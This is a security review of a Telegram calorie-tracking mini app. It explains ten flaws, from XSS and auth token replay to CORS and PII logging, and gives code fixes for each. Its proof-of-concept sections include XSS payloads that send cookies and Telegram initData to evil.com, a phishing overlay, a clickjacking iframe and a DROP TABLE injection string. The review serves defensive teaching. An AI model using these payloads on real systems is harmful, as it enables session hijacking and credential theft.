# TeleCal Security Review & Education Plan

This document explains each security concern in detail, demonstrates how vulnerabilities could be exploited, and proposes fixes. Issues are ordered from highest to lowest severity.

---

## 1. XSS (Cross-Site Scripting) Vulnerability — HIGH SEVERITY

**File:** `src/web/views/app.html` (Lines 347-358)

### What is XSS?

Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious JavaScript code into a web page that gets executed in other users' browsers. The attacker's code runs with the same privileges as legitimate code on your page.

### The Vulnerable Code

```javascript
// Lines 347-358 in app.html
container.innerHTML = `
  <div class="food-log-header">${header} &bull; ${total} cal</div>
  ${items.map(item => `
    <div class="food-item">
      <div class="food-emoji">${item.emoji || '🍴'}</div>
      <div class="food-details">
        <div class="food-name">${item.description}</div>
      </div>
      <div class="food-calories">${item.calories}</div>
    </div>
  `).join('')}
`;
```

### Why This is Dangerous

The `innerHTML` property interprets content as HTML. When you interpolate `${item.description}` directly, any HTML/JavaScript in that string gets executed.

The dangerous data flow:
1. User types food via `/log` command: `"Ate <script>alert('XSS')</script> pizza"`
2. AI processes this and may preserve the text in the description
3. Description gets stored in SQLite database
4. Mini App fetches this data via `/api/today`
5. JavaScript interpolates it into `innerHTML`
6. **Browser executes the script!**

### Proof of Concept Attack

**Attack Vector 1: Session Hijacking**
```
User logs food via Telegram:
/log <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">

When the Mini App loads:
- The <img> tag renders
- Since there's no "x" image, onerror fires
- User's session data gets sent to attacker's server
```

**Attack Vector 2: Phishing via DOM Manipulation**
```
User logs:
/log <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h1>Session Expired</h1><input type="password" placeholder="Re-enter password"></div>

Result:
- A fake overlay covers the entire Mini App
- User thinks they need to re-authenticate
- Attacker captures credentials
```

**Attack Vector 3: Telegram WebApp Exploitation**
```javascript
// The attacker injects:
<script>
  // Access Telegram WebApp data
  const initData = window.Telegram.WebApp.initData;
  // Send to attacker
  new Image().src = 'https://evil.com/steal?' + initData;
</script>
```

### The Fix

**Option A: Use textContent (Recommended)**
```javascript
function renderFoodLog(container, items, date) {
  container.innerHTML = ''; // Clear first

  if (!items || items.length === 0) {
    const emptyDiv = document.createElement('div');
    emptyDiv.className = 'empty-state';
    emptyDiv.innerHTML = '<div class="empty-state-icon">🍽️</div>';
    const text = document.createElement('div');
    text.textContent = `No food logged${date ? ' for ' + formatDate(date) : ''}`;
    emptyDiv.appendChild(text);
    container.appendChild(emptyDiv);
    return;
  }

  const header = date ? formatDate(date) : "Today's Log";
  const total = items.reduce((sum, item) => sum + item.calories, 0);

  const headerDiv = document.createElement('div');
  headerDiv.className = 'food-log-header';
  headerDiv.textContent = `${header} • ${total} cal`;
  container.appendChild(headerDiv);

  items.forEach(item => {
    const itemDiv = document.createElement('div');
    itemDiv.className = 'food-item';

    const emoji = document.createElement('div');
    emoji.className = 'food-emoji';
    emoji.textContent = item.emoji || '🍴';

    const details = document.createElement('div');
    details.className = 'food-details';
    const name = document.createElement('div');
    name.className = 'food-name';
    name.textContent = item.description;  // Safe: textContent escapes HTML
    details.appendChild(name);

    const calories = document.createElement('div');
    calories.className = 'food-calories';
    calories.textContent = item.calories;

    itemDiv.appendChild(emoji);
    itemDiv.appendChild(details);
    itemDiv.appendChild(calories);
    container.appendChild(itemDiv);
  });
}
```

**Option B: HTML Escape Function**
```javascript
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// Then use it in templates:
container.innerHTML = `
  <div class="food-name">${escapeHtml(item.description)}</div>
`;
```

### Key Takeaway

> **Never use `innerHTML` with user-controlled data.** Always use `textContent` for text, or explicitly escape HTML entities before interpolation.

---

## 2. Auth Token Replay Vulnerability — HIGH SEVERITY

**File:** `src/web/auth.ts` (Lines 45-54)

### What is Token Replay?

Token replay is when an attacker captures a valid authentication token and reuses it to impersonate the legitimate user.

### The Vulnerable Code

```typescript
// Lines 45-54 in auth.ts
// Optional: Check auth_date is not too old (1 hour)
const authDate = params.get("auth_date")
if (authDate) {
  const authTimestamp = parseInt(authDate, 10) * 1000
  const now = Date.now()
  const oneHour = 60 * 60 * 1000
  if (now - authTimestamp > oneHour) {
    return null
  }
}
```

### Why This is Dangerous

1. **"Optional" comment** — The code structure suggests this check could be removed
2. **1-hour window** — That's a long time for an attacker to exploit a captured token
3. **No check if auth_date is missing** — If `auth_date` is null, the check is skipped entirely

### Proof of Concept Attack

**Scenario: Man-in-the-Middle on Shared WiFi**

```
1. Victim opens TeleCal Mini App on coffee shop WiFi
2. Attacker captures the HTTP request (if not using HTTPS) or uses a malicious proxy
3. Attacker extracts: Authorization: tg-init-data user=...&auth_date=1738368000&hash=abc123
4. For the next HOUR, attacker can:
   - Call GET /api/today to see victim's food logs
   - Call GET /api/user to see victim's settings
   - Call GET /api/stats to see victim's calorie history
```

**Scenario: Browser History/Cache Leak**

```
1. Attacker gains temporary access to victim's device
2. Extracts init data from browser's network tab or localStorage
3. Token is valid for 1 hour from generation
4. Attacker uses it from their own device to access API
```

### The Fix

```typescript
export function validateInitData(
  initData: string,
  botToken: string
): TelegramUser | null {
  if (!initData) return null

  try {
    const params = new URLSearchParams(initData)
    const hash = params.get("hash")
    if (!hash) return null

    // REQUIRED: Validate auth_date exists and is recent
    const authDate = params.get("auth_date")
    if (!authDate) {
      return null  // auth_date is REQUIRED, not optional
    }

    const authTimestamp = parseInt(authDate, 10)
    if (isNaN(authTimestamp)) {
      return null  // Invalid auth_date format
    }

    const authMs = authTimestamp * 1000
    const now = Date.now()
    const maxAge = 5 * 60 * 1000  // 5 minutes instead of 1 hour

    if (now - authMs > maxAge) {
      return null  // Token too old
    }

    // Also check for future dates (clock skew attack)
    if (authMs > now + 60000) {  // Allow 1 minute of clock skew
      return null  // Token from the future
    }

    params.delete("hash")

    // ... rest of validation
  } catch {
    return null
  }
}
```

### Key Takeaway

> **Authentication checks should be mandatory, not optional.** Reduce token validity windows to the minimum acceptable time. In security, defense-in-depth means making every check as strict as possible.

---

## 3. Overly Permissive CORS — MEDIUM SEVERITY

**File:** `src/web/server.ts` (Line 103)

### What is CORS?

Cross-Origin Resource Sharing (CORS) controls which websites can make requests to your API. The `Access-Control-Allow-Origin` header tells browsers which origins are allowed.

### The Vulnerable Code

```typescript
// Line 103 in server.ts
function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",  // <-- Allows ANY website!
    },
  })
}
```

### Why This is Dangerous

With `*`, any website can make JavaScript requests to your API. While your auth is required, this enables:

1. **Credential probing** — Attacker sites can check if users have TeleCal accounts
2. **Error message enumeration** — Learn API structure from error responses
3. **Timing attacks** — Measure response times to infer data

### Proof of Concept Attack

**Attacker's malicious website (evil.com):**

```html
<script>
// When a TeleCal user visits evil.com:
const stolenInitData = localStorage.getItem('someKey'); // If available

// Or probe the API structure:
fetch('https://your-telecal.com/api/user', {
  headers: { 'Authorization': 'tg-init-data fake' }
})
.then(r => r.json())
.then(data => {
  // Even the error message reveals API behavior:
  // { "error": "Unauthorized" } tells attacker this endpoint exists
  console.log('API structure leaked:', data);
});

// Or if XSS was successful and stole initData:
fetch('https://your-telecal.com/api/today', {
  headers: { 'Authorization': 'tg-init-data ' + stolenInitData }
})
.then(r => r.json())
.then(data => {
  // Attacker now has user's food logs
  sendToAttacker(data);
});
</script>
```

### The Fix

```typescript
function jsonResponse(data: unknown, status = 200, request?: Request): Response {
  // Only allow requests from Telegram's domains
  const allowedOrigins = [
    'https://web.telegram.org',
    'https://webz.telegram.org',
    'https://weba.telegram.org',
  ];

  const origin = request?.headers.get('Origin') || '';
  const allowOrigin = allowedOrigins.includes(origin) ? origin : allowedOrigins[0];

  return new Response(JSON.stringify(data), {
    status,
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": allowOrigin,
      "Access-Control-Allow-Methods": "GET, OPTIONS",
      "Access-Control-Allow-Headers": "Authorization, Content-Type",
      "X-Content-Type-Options": "nosniff",
      "X-Frame-Options": "DENY",
    },
  })
}
```

### Key Takeaway

> **Never use `*` for CORS in production unless you're running a truly public API.** Explicitly whitelist only the origins that need access.

---

## 4. Missing Security Headers — MEDIUM SEVERITY

**File:** `src/web/server.ts` (Response handling)

### What are Security Headers?

HTTP security headers instruct browsers to enable security features that protect against common attacks.

### Currently Missing Headers

| Header | Purpose |
|--------|---------|
| `Content-Security-Policy` | Prevents XSS by controlling script sources |
| `X-Content-Type-Options` | Prevents MIME-sniffing attacks |
| `X-Frame-Options` | Prevents clickjacking |
| `Strict-Transport-Security` | Forces HTTPS |
| `Referrer-Policy` | Controls information leakage via Referer header |

### Proof of Concept Attacks

**Clickjacking Attack (without X-Frame-Options):**
```html
<!-- Attacker's site -->
<iframe src="https://your-telecal.com" style="opacity:0;position:absolute;"></iframe>
<button style="position:relative;">Click here for free stuff!</button>
<!-- User clicks, but actually interacts with your hidden iframe -->
```

**MIME Sniffing Attack (without X-Content-Type-Options):**
```
Attacker uploads file named "image.jpg" that contains JavaScript
Browser might execute it as JavaScript despite Content-Type
```

### The Fix

```typescript
async function serveHtml(): Promise<Response> {
  const htmlPath = new URL("./views/app.html", import.meta.url).pathname
  const file = Bun.file(htmlPath)

  if (!(await file.exists())) {
    return new Response("Mini App not found", { status: 404 })
  }

  return new Response(file, {
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "X-Content-Type-Options": "nosniff",
      "X-Frame-Options": "DENY",
      "Referrer-Policy": "strict-origin-when-cross-origin",
      "Content-Security-Policy": [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline' https://telegram.org https://cdn.jsdelivr.net",
        "style-src 'self' 'unsafe-inline'",
        "connect-src 'self'",
        "img-src 'self' data:",
        "frame-ancestors 'none'",
      ].join("; "),
    },
  })
}
```

### Key Takeaway

> **Security headers are low-effort, high-impact defenses.** They're your second line of defense if other protections fail.

---

## 5. Dynamic SQL Column Construction — MEDIUM SEVERITY

**Files:** `src/db/repositories/food-logs.ts:162`, `src/db/repositories/users.ts:77`

### The Pattern

```typescript
// food-logs.ts lines 142-163
updateItem(itemId: number, updates: Partial<...>): void {
  const sets: string[] = []
  const values: (string | number)[] = []

  if (updates.description !== undefined) {
    sets.push("description = ?")
    values.push(updates.description)
  }
  // ... more fields ...

  const sql = `UPDATE food_items SET ${sets.join(", ")} WHERE id = ?`
  this.db.run(sql, ...values)
}
```

### Why This is NOT SQL Injection (But Still Concerning)

This code is **technically safe** because:
1. Column names (`description`, `calories`) are hardcoded strings
2. Values use parameterized queries (`?`)

However, it's concerning because:
1. The pattern *looks* like dynamic SQL construction
2. Makes code review harder — reviewers must verify column sources
3. Future developers might accidentally add user-controlled column names

### Theoretical Attack (if column names were user-controlled)

```typescript
// DANGEROUS: If someone wrote this
const columnName = userInput  // User provides "description; DROP TABLE users;--"
sets.push(`${columnName} = ?`)

// Result:
// UPDATE food_items SET description; DROP TABLE users;-- = ? WHERE id = ?
// This would be SQL injection!
```

### The Fix (More Explicit Pattern)

```typescript
updateItem(
  itemId: number,
  updates: Partial<{ description: string; calories: number; emoji: string }>
): void {
  // Explicit allowlist - crystal clear what columns are valid
  const allowedColumns = ['description', 'calories', 'emoji'] as const;
  type AllowedColumn = typeof allowedColumns[number];

  const columnUpdates: { column: AllowedColumn; value: string | number }[] = [];

  if (updates.description !== undefined) {
    columnUpdates.push({ column: 'description', value: updates.description });
  }
  if (updates.calories !== undefined) {
    columnUpdates.push({ column: 'calories', value: updates.calories });
  }
  if (updates.emoji !== undefined) {
    columnUpdates.push({ column: 'emoji', value: updates.emoji });
  }

  if (columnUpdates.length === 0) return;

  // TypeScript guarantees column names are from the literal union
  const setClause = columnUpdates.map(u => `${u.column} = ?`).join(", ");
  const values = columnUpdates.map(u => u.value);

  const stmt = this.db.prepare(
    `UPDATE food_items SET ${setClause} WHERE id = ?`
  );
  stmt.run(...values, itemId);
}
```

### Key Takeaway

> **Even when code is safe, make safety obvious to reviewers.** Use explicit allowlists and types to communicate intent.

---

## 6. Unhandled JSON.parse — MEDIUM SEVERITY

**File:** `src/bot/conversations/log-flow.ts` (Lines 148, 177, 315)

### The Vulnerable Code

```typescript
// Line 148
const context = state.context ? JSON.parse(state.context) as ConversationContext : {}

// Line 177
const items = JSON.parse(state.pending_items) as FoodItem[]

// Line 315
const items = JSON.parse(state.pending_items) as FoodItem[]
```

### Why This is Dangerous

`JSON.parse()` throws an exception if the input is not valid JSON:

```javascript
JSON.parse("not json")  // Throws: SyntaxError: Unexpected token 'n'
JSON.parse("")          // Throws: SyntaxError: Unexpected end of JSON input
JSON.parse(null)        // Throws: Cannot read properties of null
```

### Potential Causes of Corrupt JSON

1. **Database corruption** — Disk errors, power loss during write
2. **Encoding issues** — UTF-8 errors during storage
3. **Concurrent modification** — Race conditions in updates
4. **Truncation** — Data cut off due to column size limits

### Proof of Concept Failure

```
1. User starts /log flow, enters food
2. AI returns estimation, state saved with pending_items
3. Database has disk error, pending_items becomes corrupted: '{"description":"pizza'
4. User types "yes" to confirm
5. JSON.parse('{"description":"pizza') throws
6. Unhandled exception crashes the conversation flow
7. User is stuck — can't confirm, can't cancel
```

### The Fix

```typescript
function safeJsonParse<T>(json: string | null, defaultValue: T): T {
  if (!json) return defaultValue;
  try {
    return JSON.parse(json) as T;
  } catch (error) {
    console.error('JSON parse error:', error, 'Input:', json?.substring(0, 100));
    return defaultValue;
  }
}

// Usage:
const context = safeJsonParse<ConversationContext>(state.context, {});
const items = safeJsonParse<FoodItem[]>(state.pending_items, []);

// In handleConfirming:
if (input === "yes" || input === "y") {
  const items = safeJsonParse<FoodItem[]>(state.pending_items, []);

  if (items.length === 0) {
    return {
      message: "Something went wrong with your saved items. Please start over with /log.",
      action: "error",
    };
  }

  // ... proceed with logging
}
```

### Key Takeaway

> **Never trust data from external sources (even your own database).** Always handle parse errors gracefully.

---

## 7. In-Memory State Without Cleanup — MEDIUM SEVERITY

**Files:** `src/bot/commands/delete.ts:14`, `edit.ts`, `settings.ts`

### The Vulnerable Code

```typescript
// delete.ts line 14
const deleteStates = new Map<number, DeleteState>()

// These Maps grow forever...
```

### Why This is Dangerous

1. **Memory leak** — User starts delete flow, never finishes, state stays forever
2. **State conflicts** — Old state from 3 days ago still exists when user returns
3. **Data exposure** — Selected item IDs persist in memory

### Proof of Concept Attack

**Memory Exhaustion DoS:**
```
1. Attacker creates 100,000 Telegram accounts (bots)
2. Each account starts a /delete flow
3. Each account's state object uses ~500 bytes
4. 100,000 × 500 = 50MB of orphaned state
5. Repeat across /delete, /edit, /settings = 150MB
6. Over time, without restarts, memory grows unbounded
```

**Stale State Confusion:**
```
1. Monday: User types /delete, sees items 1-3
2. User leaves without completing
3. Friday: User types /delete, sees items 1-5 (added more this week)
4. User types "yes" (thinking they're confirming for Friday)
5. System uses Monday's state, deletes wrong item!
```

### The Fix

```typescript
interface DeleteState {
  targetDate: string
  items: (FoodItem & { log_id: number })[]
  pendingAction: "select" | "confirm_single" | "confirm_all"
  selectedItemIndex?: number
  createdAt: number  // Add timestamp
}

const deleteStates = new Map<number, DeleteState>()

// Cleanup stale states (call periodically)
function cleanupStaleStates() {
  const maxAge = 10 * 60 * 1000;  // 10 minutes
  const now = Date.now();

  for (const [userId, state] of deleteStates) {
    if (now - state.createdAt > maxAge) {
      deleteStates.delete(userId);
    }
  }
}

// Run cleanup every 5 minutes
setInterval(cleanupStaleStates, 5 * 60 * 1000);

// Always set timestamp when creating state
deleteStates.set(userId, {
  targetDate,
  items,
  pendingAction: "select",
  createdAt: Date.now(),
});

// Validate state freshness before using
function getValidState(userId: number): DeleteState | null {
  const state = deleteStates.get(userId);
  if (!state) return null;

  const maxAge = 10 * 60 * 1000;
  if (Date.now() - state.createdAt > maxAge) {
    deleteStates.delete(userId);
    return null;
  }

  return state;
}
```

### Key Takeaway

> **Every in-memory cache needs an eviction strategy.** Always add timestamps and periodic cleanup for user-specific state.

---

## 8. Environment Variable Defaults — MEDIUM SEVERITY

**File:** `src/config.ts` (Lines 33-35)

### The Vulnerable Code

```typescript
ai: {
  openaiApiKey: getEnv("OPENAI_API_KEY", ""),
  anthropicApiKey: getEnv("ANTHROPIC_API_KEY", ""),
  googleApiKey: getEnv("GOOGLE_API_KEY", ""),
},
```

### Why This is Dangerous

1. **Silent failures** — Bot starts successfully but AI features fail
2. **Confusing errors** — Empty string passed to API → cryptic API errors
3. **No feedback** — Developer doesn't know keys are missing

### Proof of Concept Issue

```
1. Developer deploys to new server
2. Forgets to set ANTHROPIC_API_KEY
3. Bot starts successfully (no error)
4. User tries to log food
5. Anthropic API called with empty key
6. Cryptic error: "Invalid API key format"
7. Developer spends hours debugging
```

### The Fix

```typescript
interface AIConfig {
  openaiApiKey: string | null
  anthropicApiKey: string | null
  googleApiKey: string | null
}

function getOptionalEnv(key: string): string | null {
  const value = process.env[key]
  return value && value.trim() !== '' ? value : null
}

// In config:
ai: {
  openaiApiKey: getOptionalEnv("OPENAI_API_KEY"),
  anthropicApiKey: getOptionalEnv("ANTHROPIC_API_KEY"),
  googleApiKey: getOptionalEnv("GOOGLE_API_KEY"),
} as AIConfig,

// Then at startup (in index.ts or similar):
function validateConfig() {
  const providers = [
    { key: 'OPENAI_API_KEY', value: config.ai.openaiApiKey },
    { key: 'ANTHROPIC_API_KEY', value: config.ai.anthropicApiKey },
    { key: 'GOOGLE_API_KEY', value: config.ai.googleApiKey },
  ];

  const configured = providers.filter(p => p.value !== null);

  if (configured.length === 0) {
    console.error('WARNING: No AI providers configured!');
    console.error('Set at least one of: OPENAI_API_KEY, ANTHROPIC_API_KEY, GOOGLE_API_KEY');
    // Optionally: process.exit(1) for strict mode
  } else {
    console.log(`AI providers configured: ${configured.map(p => p.key).join(', ')}`);
  }
}

// In AI service:
async estimate(input: string, provider: string, context?: string) {
  const apiKey = this.getApiKey(provider);

  if (!apiKey) {
    throw new Error(
      `No API key configured for provider: ${provider}. ` +
      `Set the ${provider.toUpperCase()}_API_KEY environment variable.`
    );
  }

  // ... proceed with API call
}
```

### Key Takeaway

> **Fail loudly at startup, not silently at runtime.** Use `null` instead of empty strings to make "not configured" explicit.

---

## 9. Weak Date Validation — LOW SEVERITY

**File:** `src/utils/dates.ts` (Lines 14-17)

### The Vulnerable Code

```typescript
export function parseDate(dateStr: string): Date {
  const [year, month, day] = dateStr.split("-").map(Number)
  return new Date(year, month - 1, day)  // No validation!
}
```

### Why This is Problematic

JavaScript's `Date` constructor auto-corrects invalid dates:

```javascript
new Date(2026, 1, 30)   // Feb 30 → becomes March 2, 2026
new Date(2026, 12, 1)   // Month 13 → becomes January 1, 2027
new Date(2026, -1, 1)   // Month -1 → becomes December 1, 2025
```

### Proof of Concept Issue

```
1. API receives GET /api/day/2026-02-30
2. Regex passes (matches YYYY-MM-DD format)
3. parseDate("2026-02-30") returns March 2, 2026
4. User sees data for wrong day
5. Confusion about calorie tracking
```

### The Fix

```typescript
export function parseDate(dateStr: string): Date | null {
  // Validate format first
  if (!/^\d{4}-\d{2}-\d{2}$/.test(dateStr)) {
    return null;
  }

  const [year, month, day] = dateStr.split("-").map(Number);

  // Validate ranges
  if (year < 2020 || year > 2100) return null;  // Reasonable range
  if (month < 1 || month > 12) return null;
  if (day < 1 || day > 31) return null;

  const date = new Date(year, month - 1, day);

  // Verify date didn't auto-correct (e.g., Feb 30 → Mar 2)
  if (
    date.getFullYear() !== year ||
    date.getMonth() !== month - 1 ||
    date.getDate() !== day
  ) {
    return null;  // Date was auto-corrected, so input was invalid
  }

  return date;
}

// Usage in API:
const dayMatch = path.match(/^\/api\/day\/(\d{4}-\d{2}-\d{2})$/);
if (dayMatch) {
  const dateStr = dayMatch[1];
  const parsedDate = parseDate(dateStr);

  if (!parsedDate) {
    return jsonResponse({ error: "Invalid date" }, 400);
  }

  return jsonResponse(api.getDay(user.id, dateStr));
}
```

### Key Takeaway

> **Always validate that parsed values match input.** JavaScript's forgiving parsers can mask invalid data.

---

## 10. PII Logging — LOW SEVERITY

**Files:** `src/jobs/reminders.ts`, `src/jobs/retry-pending.ts`

### The Issue

```typescript
console.log(`Successfully processed entry ${entry.id} for user ${entry.telegram_id}`)
console.log(`Failed to send reminder to user ${user.telegram_id}:`, error)
```

### Why This Matters

1. **Log aggregation** — Logs often go to cloud services (potential data leak)
2. **Compliance** — GDPR requires minimizing personal data storage
3. **Security breach** — If logs are compromised, user IDs are exposed

### The Fix

```typescript
// Create a logging utility
function redactUserId(id: number): string {
  const str = String(id);
  if (str.length <= 4) return '****';
  return str.slice(0, 2) + '****' + str.slice(-2);
}

// Usage:
console.log(`Processed entry ${entry.id} for user ${redactUserId(entry.telegram_id)}`);
// Output: "Processed entry 123 for user 12****89"
```

---

## Summary Checklist

| Priority | Issue | File | Fix Type |
|----------|-------|------|----------|
| 🔴 HIGH | XSS via innerHTML | app.html | Use textContent/DOM APIs |
| 🔴 HIGH | Token replay | auth.ts | Make auth_date mandatory, reduce window |
| 🟡 MEDIUM | CORS `*` | server.ts | Whitelist Telegram domains |
| 🟡 MEDIUM | Missing security headers | server.ts | Add CSP, X-Frame-Options, etc. |
| 🟡 MEDIUM | Dynamic SQL pattern | food-logs.ts, users.ts | Use explicit column allowlist |
| 🟡 MEDIUM | Unhandled JSON.parse | log-flow.ts | Add try-catch with fallback |
| 🟡 MEDIUM | In-memory state leak | delete.ts, edit.ts | Add timestamps and cleanup |
| 🟡 MEDIUM | Empty API key defaults | config.ts | Use null, validate at startup |
| 🟢 LOW | Weak date validation | dates.ts | Validate parsed date matches input |
| 🟢 LOW | PII in logs | reminders.ts, retry-pending.ts | Redact user IDs |

---

## Implementation Order

1. **XSS Fix** — Highest impact, direct user harm potential
2. **Auth Token Fix** — Security boundary hardening
3. **CORS + Headers** — Quick wins, defense in depth
4. **JSON.parse Error Handling** — Prevents crashes
5. **State Cleanup** — Prevents memory issues
6. **Config Validation** — Improves developer experience
7. **Date Validation** — Data integrity
8. **SQL Pattern** — Code clarity (already safe)
9. **Log Redaction** — Compliance/privacy
